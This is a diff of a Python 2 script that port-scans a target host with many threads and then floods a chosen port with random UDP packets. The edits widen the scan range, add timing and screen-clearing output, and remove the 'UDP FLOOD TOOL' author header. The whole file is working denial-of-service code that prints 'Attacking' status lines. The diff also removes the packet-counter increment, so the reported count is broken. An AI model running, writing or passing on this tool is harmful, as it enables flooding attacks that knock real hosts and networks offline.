@@ -1,8 +1,4 @@
 #!/usr/bin/python
-#
-# UDP FLOOD TOOL
-#
-# Author: LukeBob
 
 import threading
 from datetime import datetime
@@ -11,6 +7,8 @@ import time
 import sys, traceback
 import socket
 import random
+import sys
+MAX_THREADS = 50
 
 
 
@@ -24,8 +22,7 @@ class colors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
-MAX_THREADS = 50
-split = colors.BOLD + "===========================================" + colors.ENDC
+split = colors.BOLD + "=================================================" + colors.ENDC
 
 def usage():
     print "\n"
@@ -45,7 +42,7 @@ class Scanner(threading.Thread):
 
     def run(self):
         try:
-            # connect to the host:port
+            # connect to the given host:port
             self.sock.connect((self.host, self.port))
             print "%s: %d OPEN" %(self.host, self.port)
             self.sock.close()
@@ -53,10 +50,10 @@ class Scanner(threading.Thread):
 
 class pyScan:
     def __init__(self, args=[]):
-        # arguments 
+        # arguments vector
         self.args = args
         # start port and end port
-        self.start, self.stop = 1, 10001
+        self.start, self.stop = 1, 65535
         # host name
         self.host = ""
 
@@ -64,8 +61,10 @@ class pyScan:
         if len(self.args) == 4:
             self.host = self.args[1]
             try:
+                subprocess.call("clear", shell=True)
                 self.start = int(self.args[2])
                 self.stop = int(self.args[3])
+                print "\n"
                 print "Scanning:", sys.argv[1]
                 print split
             except ValueError:
@@ -75,7 +74,9 @@ class pyScan:
                 usage()
                 return
         elif len(self.args) == 2:
+            subprocess.call("clear", shell=True)
             self.host = self.args[1]
+            print "\n"
             print "Scanning:", sys.argv[1]
             print split
         else:
@@ -89,6 +90,7 @@ class pyScan:
         self.scan(self.host, self.start, self.stop)
 
     def scan(self, host, start, stop):
+        t1 = datetime.now()
         self.port = start
         while self.port <= stop:
             while threading.activeCount() < MAX_THREADS:
@@ -96,13 +98,18 @@ class pyScan:
                 self.port += 1
                 if self.port == self.stop:
                     time.sleep(5)
+                    t2 = datetime.now()
+                    total = t2 - t1
+                    print split
+                    print "\n"
+                    print 'Scan Complete in: ',(total)
+                    print "\n"
                     Flood()
+                    
 def Flood():
     try:
         target = sys.argv[1]
         host = socket.gethostbyname(target)
-        print split
-        print "\n" * 2
         print split
         length = int(raw_input("How many Packets Would you like to send?: "))
         print split
@@ -115,22 +122,28 @@ def Flood():
         print ""
         time.sleep(1)
         subprocess.call('clear', shell=True)
+        print "\n"
+        print "Sending Data..."
+        print split
 
         for i in range(length):
             bytes = random._urandom(1024)
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+            sock.setsockopt(socket.SOL_SOCKET,socket.SO_SNDBUF, 1024)
             sock.sendto(bytes, (host, PORT))
-            print "(Attacking: %s) (Sent %s Packets) (Destination Port: %s)"%(host, SENT, PORT)
             time.sleep(0.01)
-            SENT=SENT + 1
+            print "(Attacking: %s) (Sent %s Packets) (Destination Port: %s)"%(host, SENT, PORT)
+        sys.exit(0)   
+           
+               
 
     except KeyboardInterrupt:
-        print "Shutdown requested...exiting"
+        print "Exiting..."
     except Exception:
         traceback.print_exc(file=sys.stdout)
     sys.exit(0)
 
-if __name__ == "__main__":
-  print "\n"
+
+if __name__ == '__main__':
   pyScan(sys.argv)
   				
